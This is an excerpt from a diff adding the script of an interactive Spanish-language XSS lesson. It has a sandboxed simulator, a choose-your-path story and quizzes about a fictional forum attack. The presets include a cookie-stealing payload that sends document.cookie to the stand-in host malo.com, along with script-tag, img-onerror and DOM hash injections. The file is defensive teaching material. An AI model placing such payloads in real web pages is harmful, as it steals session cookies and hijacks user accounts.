+$$('[data-type]').forEach(b => b.onclick = () => { if (!playing) setType(b.dataset.type); });
+$('#nextStep').onclick = () => {
+  if (playing) return;
+  const n = TYPES[curType].steps.length;
+  if (stepIdx >= n - 1) { setType(curType); return; }
+  showStep(stepIdx + 1, true);
+};
+$('#prevStep').onclick = () => { if (!playing && stepIdx > 0) showStep(stepIdx - 1, false); };
+$('#resetStep').onclick = () => { playing = false; setType(curType); };
+setType('reflejado');
+
+/* ---------- cap 3: cómic + simulador ---------- */
+$('#comic').innerHTML = XSSA.comic().join('');
+/* Laboratorio seguro: nada de lo que se escribe se ejecuta. El HTML "vulnerable" se muestra en un
+   iframe con sandbox vacío (sin scripts) y los efectos del ataque se simulan a partir de patrones. */
+const COOKIE = 'sesion=ana_7f3c9e';
+const STEAL = 'new Image().src="https://malo.com/?c="+document.cookie';
+const VECTORS = {
+  stored: {
+    help: 'n0cturno publica un comentario. Queda guardado en el foro y llega a cada persona que abre la Tarea 3.',
+    prefix: '', btn: 'Publicar como n0cturno', url: () => 'foroclase.edu/tarea-3',
+    presets: [['normal', '¡Gracias por la explicación!'], ['paso 1: reconocimiento', 'Prueba <b>negrita</b>'],
+      ['alert', "<script>alert('XSS')<\/script>"], ['robo de cookie', '¡Gran tarea! <script>' + STEAL + '<\/script>'],
+      ['img onerror', "<img src=x onerror=alert('XSS')>"]] },
+  reflected: {
+    help: 'n0cturno le envía a Ana un enlace al buscador del foro. El servidor repite en la página lo que va después de ?q=, y solo afecta a quien abre el enlace.',
+    prefix: 'foroclase.edu/buscar?q=', btn: 'Ana abre el enlace', url: v => 'foroclase.edu/buscar?q=' + encodeURIComponent(v),
+    presets: [['búsqueda normal', 'tarea 3'], ['negrita', '<b>tarea</b>'],
+      ['robo de cookie', '<script>' + STEAL + '<\/script>'], ['img onerror', '<img src=x onerror=alert(1)>']] },
+  dom: {
+    help: 'El JavaScript del foro saluda con lo que va después de # (saludo.innerHTML = location.hash). Esa parte de la URL nunca llega al servidor.',
+    prefix: 'foroclase.edu/tarea-3#', btn: 'Ana abre el enlace', url: v => 'foroclase.edu/tarea-3#' + v,
+    presets: [['nombre normal', 'Ana'], ['negrita', '<b>Ana</b>'], ['img onerror', '<img src=x onerror=alert(1)>'],
+      ['robo de cookie', '<img src=x onerror="' + STEAL.replace(/"/g, "'") + '">']] },
+};
+let simMode = 'v', vector = 'stored';
+const atk = { hits: [], hijacked: false };
+
+function el(tag, cls, text){ const e = document.createElement(tag); if (cls) e.className = cls; if (text != null) e.textContent = text; return e; }
+function sandboxFrame(html){
+  const fr = document.createElement('iframe');
+  fr.setAttribute('sandbox', '');   // sin allow-scripts: el navegador no ejecuta nada dentro
+  fr.srcdoc = '<style>body{margin:0;font:14px Inter,system-ui,sans-serif;color:#13213A}</style>' + html;
+  return fr;
+}
+function log(cls, txt){ const L = $('#simLog'); if (L.dataset.empty) { L.innerHTML = ''; delete L.dataset.empty; } L.appendChild(el('div', cls, txt)); L.scrollTop = L.scrollHeight; }
+function clearLog(){ const L = $('#simLog'); L.innerHTML = ''; L.appendChild(el('div', 'm', 'Esperando…')); L.dataset.empty = '1'; }
+
+function victimHome(){
+  const f = $('#forum'); f.innerHTML = '';
+  const cm = el('div', 'cm');
+  if (vector === 'stored') { cm.appendChild(el('b', '', 'prof_luis')); cm.append('Recuerden entregar la tarea 3 el viernes.'); }
+  if (vector === 'reflected') { cm.appendChild(el('b', '', 'Buscador de ForoClase')); cm.append('Escribe algo para buscar.'); }
+  if (vector === 'dom') { cm.appendChild(el('b', '', 'Tarea 3 · saludo personalizado')); cm.append('¡Hola!'); }
+  f.appendChild(cm);
+  $('#simUrl').textContent = VECTORS[vector].url('') + ' · sesión: ana';
+}
+function renderAtk(){
+  const box = $('#atk'); box.innerHTML = '';
+  if (atk.hijacked) {
+    $('#atkUrl').textContent = 'foroclase.edu/perfil · sesión: ana (robada)';
+    const h = el('div', 'hijack');
+    h.appendChild(el('b', 'big', 'Bienvenida, Ana'));
+    h.appendChild(el('span', '', 'n0cturno pegó la cookie robada en su navegador y ForoClase lo trata como Ana, sin pedir contraseña. Ahora puede:'));
+    const ul = el('ul'); ['Publicar comentarios como Ana', 'Leer sus mensajes y tareas', 'Cambiar su correo y bloquearla'].forEach(t => ul.appendChild(el('li', '', t)));
+    h.appendChild(ul);
+    h.appendChild(el('span', '', 'Defensa: con la marca HttpOnly, document.cookie no habría revelado la sesión.'));
+    box.appendChild(h); return;
+  }
+  $('#atkUrl').textContent = 'malo.com/registro';
+  box.appendChild(el('div', 'muted', '// peticiones recibidas en malo.com'));
+  if (!atk.hits.length) { box.appendChild(el('div', 'muted', 'Esperando víctimas…')); return; }
+  atk.hits.forEach(t => box.appendChild(el('div', 'row', t)));
+  const b = el('button', 'btn red', 'Entrar a ForoClase con esta cookie'); b.style.cssText = 'margin-top:10px;background:var(--red);color:#fff;padding:8px 14px';
+  b.onclick = () => { atk.hijacked = true; renderAtk(); log('r', '⚠ [simulado] n0cturno entró a ForoClase con la sesión de Ana.'); };
+  box.appendChild(b);
+}
+function setVector(v){
+  vector = v; const V = VECTORS[v];
+  $$('[data-vec]').forEach(b => b.classList.toggle('on', b.dataset.vec === v));
+  $('#vecHelp').textContent = V.help;
+  $('#urlPrefix').hidden = !V.prefix; $('#urlPrefix').textContent = V.prefix;
+  $('#simPost').textContent = V.btn;
+  const chips = $('#simChips'); chips.innerHTML = '';
+  V.presets.forEach(([label, val]) => { const c = el('span', 'chip', label); c.onclick = () => { $('#simIn').value = val; }; chips.appendChild(c); });
+  $('#simIn').value = (V.presets.find(p => p[0] === 'robo de cookie') || V.presets[0])[1];
+  victimHome(); clearLog();
+}
+function resetSim(){ atk.hits = []; atk.hijacked = false; renderAtk(); setVector(vector); }
+
+$('#modeV').onclick = () => { simMode = 'v'; $('#modeV').classList.add('on'); $('#modeP').classList.remove('on'); };
+$('#modeP').onclick = () => { simMode = 'p'; $('#modeP').classList.add('on'); $('#modeV').classList.remove('on'); };
+$$('[data-vec]').forEach(b => b.onclick = () => setVector(b.dataset.vec));
+$('#simReset').onclick = resetSim;
+
+$('#simPost').onclick = () => {
+  const v = $('#simIn').value; if (!v.trim()) return;
+  const f = $('#forum'), vuln = simMode === 'v';
+  f.querySelectorAll('.fake-alert').forEach(o => o.remove());
+  $('#simUrl').textContent = VECTORS[vector].url(v) + ' · sesión: ana';
+
+  // 1. Lo que ve Ana
+  let cm;
+  if (vector === 'stored') { cm = el('div', 'cm'); cm.appendChild(el('b', '', 'n0cturno' + (vuln ? '' : ' · texto escapado'))); f.appendChild(cm); }
+  else { f.innerHTML = ''; cm = el('div', 'cm'); cm.appendChild(el('b', '', vector === 'reflected' ? 'Buscador de ForoClase' : 'Tarea 3 · saludo personalizado')); f.appendChild(cm); }
+  const shown = vector === 'reflected' ? 'Resultados para: ' + v : vector === 'dom' ? '¡Hola, ' + v + '!' : v;
+  if (vuln) cm.appendChild(sandboxFrame(vector === 'reflected' ? 'Resultados para: ' + v : vector === 'dom' ? '¡Hola, ' + v + '!' : v));
+  else cm.appendChild(el('span', '', shown));
+
+  // 2. Registro
+  if (!vuln) {
+    log('g', vector === 'stored' ? '✓ El servidor escapó el comentario antes de mostrarlo.'
+      : vector === 'reflected' ? '✓ El servidor escapó el parámetro q antes de repetirlo.'
+      : '✓ El sitio usa saludo.textContent = location.hash.');
+    log('g', '✓ El navegador de Ana lo muestra como texto. Nada se ejecuta.');
+    return;
+  }
+  log('a', vector === 'stored' ? '→ El servidor guardó el comentario sin escapar.'
+    : vector === 'reflected' ? '→ El servidor insertó el parámetro q en la página sin escapar.'
+    : '→ El JavaScript del sitio ejecutó saludo.innerHTML = location.hash.');
+  if (vector === 'dom') log('m', '· El servidor nunca recibió lo que va después de #: sus registros no muestran nada.');
+  if (!/<\/?[a-zA-Z]/.test(v)) { log('m', '· Solo texto: no hay nada que ejecutar.'); return; }
+  if (!DANGER.test(v)) { log('a', '◐ El HTML se interpretó (fíjate en el formato). La puerta está abierta.'); return; }
+  log('r', '⚠ [simulado] El navegador de Ana encontró código y lo ejecutó.');
+
+  // 3. Efectos simulados
+  const steals = /cookie/i.test(v);
+  if (steals) {
+    log('r', '→ [simulado] GET https://malo.com/?c=' + COOKIE);
+    atk.hits.push('[' + new Date().toLocaleTimeString('es') + '] GET /?c=' + COOKIE + '  ← ' + (vector === 'stored' ? 'comentario #37' : vector === 'reflected' ? 'enlace del buscador' : 'enlace con #'));
+    renderAtk();
+  }
+  const msg = (v.match(/alert\(\s*['"]?([^'")]*)/i) || [])[1];
+  const ov = el('div', 'fake-alert');
+  const box = el('div', 'box'); box.appendChild(el('small', '', 'foroclase.edu dice (simulación)'));
+  box.appendChild(el('div', '', steals ? '(Ana no ve nada… pero su cookie de sesión acaba de llegar a malo.com)' : (msg || 'XSS')));
+  const ok = el('button', 'btn', 'Aceptar'); ok.style.cssText = 'padding:6px 16px;margin-top:12px;float:right'; ok.onclick = () => ov.remove();
+  box.appendChild(ok); ov.appendChild(box); f.appendChild(ov);
+};
+renderAtk(); setVector('stored');
+
+/* ---------- cap 4: historia ---------- */
+let security = 50;
+const SCENES = {
+  s1:{ who:'Lunes anterior · 9:00', text:'El director te pide agregar comentarios al foro «para mañana». Tienes poco tiempo. ¿Cómo muestras los comentarios?', choices:[
+    { t:'Uso innerHTML: es lo más rápido.', d:-25, go:'s2a' },
+    { t:'Uso textContent y escapo la salida.', d:+25, go:'s2b' } ] },
+  s2a:{ who:'Domingo · 2:13 a. m.', text:'Un usuario nuevo, n0cturno, publica «<b>hola</b>» y aparece en negrita. Horas después publica «¡Gran tarea!» con un <script>. El lunes, 37 cuentas publican mensajes que sus dueños no escribieron.', choices:[
+    { t:'Borro el comentario y no digo nada.', d:-20, go:'end_bad' },
+    { t:'Cierro los comentarios, corrijo el código e invalido todas las sesiones.', d:+15, go:'s3' } ] },
+  s2b:{ who:'Domingo · 2:13 a. m.', text:'n0cturno intenta publicar un <script>. En pantalla solo aparece el texto «<script>…» sin ejecutarse. Tu código resistió. Sistemas te pregunta si quieres reforzar algo más.', choices:[
+    { t:'Activo cookies HttpOnly y una política CSP.', d:+25, go:'end_great' },
+    { t:'No hace falta, ya funciona.', d:0, go:'end_ok' } ] },
+  s3:{ who:'Lunes · 10:00', text:'El foro vuelve a estar en línea con textContent. ¿Qué haces con Ana y los otros 36 afectados?', choices:[
+    { t:'Les aviso, explico lo ocurrido y cierro todas sus sesiones.', d:+20, go:'end_recover' },
+    { t:'Mejor no asustar a nadie.', d:-15, go:'end_bad' } ] },
+  end_bad:{ who:'Final · Caso empeorado', end:true, text:'n0cturno volvió a entrar por otra página vulnerable. Las cuentas se usaron para enviar enlaces trampa a toda la escuela. Lección: ocultar un incidente no lo resuelve; corregir la causa y comunicar sí.' },
+  end_recover:{ who:'Final · Daño contenido', end:true, text:'Hubo daño, pero lo contuviste: corregiste la causa, cerraste sesiones y fuiste transparente. Lección: la seguridad también es saber responder a un incidente.' },
+  end_ok:{ who:'Final · Protegido… por ahora', end:true, text:'El foro resiste este ataque. Pero si algún día un compañero usa innerHTML en otra página, no habrá una segunda capa. Lección: defensa en profundidad.' },
+  end_great:{ who:'Final · Ataque frustrado', end:true, text:'¡Excelente! Escapas la salida, tus cookies son HttpOnly y CSP bloquea scripts inyectados. En esta línea temporal, el caso ForoClase nunca ocurrió.' },
+};
+function scene(id){
+  const S = SCENES[id], box = $('#story'); box.innerHTML = '';
+  const d = document.createElement('div'); d.className = 'scene';
+  d.innerHTML = '<div class="face"><svg viewBox="0 0 120 120"><use href="#dani"/></svg></div><div class="txt" style="flex:1"></div>';
+  const t = d.querySelector('.txt');
+  const w = document.createElement('div'); w.className = 'who-t'; w.textContent = S.who; t.appendChild(w);
+  const p = document.createElement('p'); p.textContent = S.text; t.appendChild(p);
+  const ch = document.createElement('div'); ch.className = 'choices';
+  (S.choices || [{ t:'↺ Volver a empezar', d:null, go:'s1' }]).forEach(c => {
+    const b = document.createElement('button'); b.className = 'choice'; b.textContent = c.t;
+    b.onclick = () => { security = c.d === null ? 50 : Math.max(0, Math.min(100, security + c.d)); meter(); scene(c.go); };
+    ch.appendChild(b);
+  });
+  t.appendChild(ch); box.appendChild(d);
+}
+function meter(){ $('#meter').style.width = security + '%'; $('#meterTxt').textContent = security + '%'; }
+meter(); scene('s1');
+
+/* ---------- cap 5: comparación ---------- */
+function c5(){
+  const v = $('#c5in').value;
+  $('#c5good').textContent = v;
+  $('#c5esc').textContent = esc(v);
+  const bad = $('#c5bad'); bad.innerHTML = '';
+  const fr = document.createElement('iframe'); fr.setAttribute('sandbox', ''); fr.style.cssText = 'border:none;width:100%;height:44px';
+  fr.srcdoc = '<style>body{margin:0;font:14px Inter,system-ui,sans-serif;color:#13213A}</style>' + v; bad.appendChild(fr);
+  $('#c5badV').innerHTML = DANGER.test(v) ? '<span style="color:var(--red)">⚠ En un sitio real, este código se ejecutaría.</span>'
+    : /<\/?[a-zA-Z]/.test(v) ? '<span style="color:var(--amber)">◐ El HTML se interpreta.</span>' : '<span style="color:var(--muted)">Sin etiquetas: ambos se ven igual.</span>';
+}
+$('#c5in').addEventListener('input', c5); c5();
+$$('.layer').forEach(l => l.onclick = () => l.classList.toggle('open'));
+
+/* ---------- misión ---------- */
+const M1 = [
+  ['perfil.innerHTML = usuario.nombre;', 'V', 'innerHTML interpreta el nombre como HTML.'],
+  ['perfil.textContent = usuario.nombre;', 'S', 'textContent siempre inserta texto.'],
+  ['document.write(location.search);', 'V', 'Escribe la URL directamente en la página: XSS basado en DOM.'],
+  ["echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');", 'S', 'htmlspecialchars escapa los caracteres especiales.'],
+];
+M1.forEach(([code, ans, why]) => {
+  const row = document.createElement('div'); row.style.cssText = 'display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin:8px 0';
+  const pre = document.createElement('code'); pre.textContent = code; pre.style.cssText = 'flex:1;min-width:240px;background:#081324;padding:8px 10px;border-radius:8px;font-size:13px';
+  const fb = document.createElement('div'); fb.className = 'fb'; fb.style.width = '100%';
+  row.appendChild(pre);
+  ['V', 'S'].forEach(k => {
+    const b = document.createElement('button'); b.className = 'opt'; b.style.padding = '7px 14px';
+    b.textContent = k === 'V' ? 'Vulnerable' : 'Seguro';
+    b.onclick = () => { row.querySelectorAll('.opt').forEach(x => x.disabled = true); b.classList.add(k === ans ? 'right' : 'wrong');
+      fb.textContent = (k === ans ? '✓ Correcto. ' : '✗ No. ') + why; };
+    row.appendChild(b);
+  });
+  row.appendChild(fb); $('#m1').appendChild(row);
+});
+$('#m2btn').onclick = () => {
+  const norm = s => s.replace(/\s+/g, ' ').trim();
+  const ok = norm($('#m2in').value) === norm(esc('<b onclick="x()">Hola</b>'));
+  $('#m2fb').innerHTML = ok ? '<span style="color:var(--green)">✓ ¡Perfecto! Así se ve el texto sin ejecutarse.</span>'
+    : '<span style="color:var(--red)">✗ Aún no. Revisa &lt;, &gt; y las comillas dobles.</span>';
+};
+$('#m2hint').onclick = () => { $('#m2fb').textContent = 'Pista: < → &lt;   > → &gt;   " → &quot;'; };
+
+/* ---------- sala de evidencias ---------- */
+const KEY = 'ESCAPAR';
+$('#cipher').innerHTML = [...KEY].map(c => `<code>&amp;#${c.charCodeAt(0)};</code>`).join('');
+$('#ascii').innerHTML = Array.from({ length:26 }, (_, i) => `<div><b>${String.fromCharCode(65 + i)}</b><span>${65 + i}</span></div>`).join('');
+$('#asciiBtn').onclick = () => { const a = $('#ascii'); a.hidden = !a.hidden; $('#asciiBtn').textContent = a.hidden ? 'Mostrar tabla de entidades' : 'Ocultar tabla'; };
+const CASE = [
+  ['¿Qué tipo de XSS usó n0cturno? (Ev. B)', ['Reflejado', 'Almacenado', 'Basado en DOM'], 1],
+  ['¿Qué robó? (Ev. C)', ['Las contraseñas', 'Las cookies de sesión', 'La base de datos completa'], 1],
+  ['¿Por qué se propagó solo? (Ev. D)', ['Era un virus de correo', 'Actuó como gusano: las cuentas robadas repetían el comentario', 'Falló el wifi del colegio'], 1],
+  ['¿Qué debe cambiar Dani en la línea 42? (Ev. E)', ['Usar textContent o escapar el texto', 'Pedir contraseñas más largas', 'Cambiar el color del foro'], 0],
+];
+CASE.forEach(([q, opts], i) => {
+  const d = document.createElement('div'); d.className = 'case-q';
+  const l = document.createElement('label'); l.textContent = (i + 1) + '. ' + q; l.htmlFor = 'cq' + i; d.appendChild(l);
+  const s = document.createElement('select'); s.id = 'cq' + i;
+  s.innerHTML = '<option value="">— Elige —</option>' + opts.map((o, j) => `<option value="${j}">${esc(o)}</option>`).join('');
+  d.appendChild(s); $('#caseForm').appendChild(d);
+});
+function unlock(){ $('#closeCase').classList.remove('locked'); $('#vaultFb').innerHTML = '<span style="color:var(--green)">✓ Clave correcta. «Escapar» es justo lo que le faltó a ForoClase. Completa el informe.</span>'; $('#vaultIn').value = KEY; }
+$('#vaultBtn').onclick = () => {
+  if ($('#vaultIn').value.trim().toUpperCase() === KEY) { store.set('sala', true); unlock(); $('#closeCase').scrollIntoView({ behavior:'smooth', block:'center' }); }
+  else { const c = $('#vaultIn'); c.classList.remove('shake'); void c.offsetWidth; c.classList.add('shake'); $('#vaultFb').textContent = '✗ Clave incorrecta. Cada &#número; es una letra: &#65; = A, &#66; = B…'; }
+};
+$('#vaultIn').addEventListener('keydown', e => { if (e.key === 'Enter') $('#vaultBtn').click(); });
+if (store.get('sala')) unlock();
+function closedCase(){
+  $('#caseStamp').textContent = 'CASO CERRADO'; $('#caseStamp').classList.add('ok');
+  $('#caseResult').innerHTML = `<div class="card badge" style="background:var(--navy)"><div class="medal" style="border-color:var(--amber)">${icon('i-search', 'color:var(--amber)')}</div><h3 style="justify-content:center;font-size:26px">Detective XSS</h3><p style="margin:0">Caso cerrado. n0cturno usó un <b>XSS almacenado</b> para robar <b>cookies de sesión</b>, y el ataque se propagó como un gusano. Con <code>textContent</code>, cookies <code>HttpOnly</code> y CSP, no vuelve a pasar.</p></div>`;
+}
+$('#caseBtn').onclick = () => {
+  const ok = CASE.filter((c, i) => $('#cq' + i).value === String(c[2])).length;
+  if (ok === CASE.length) { store.set('cerrado', true); closedCase(); }
+  else $('#caseResult').innerHTML = `<span style="color:var(--red)">${ok} de ${CASE.length} correctas. Revisa tus evidencias en el expediente y vuelve a intentarlo.</span>`;
+};
+if (store.get('cerrado')) { CASE.forEach((c, i) => $('#cq' + i).value = String(c[2])); closedCase(); }
+
+</script>
+</body>
+</html>
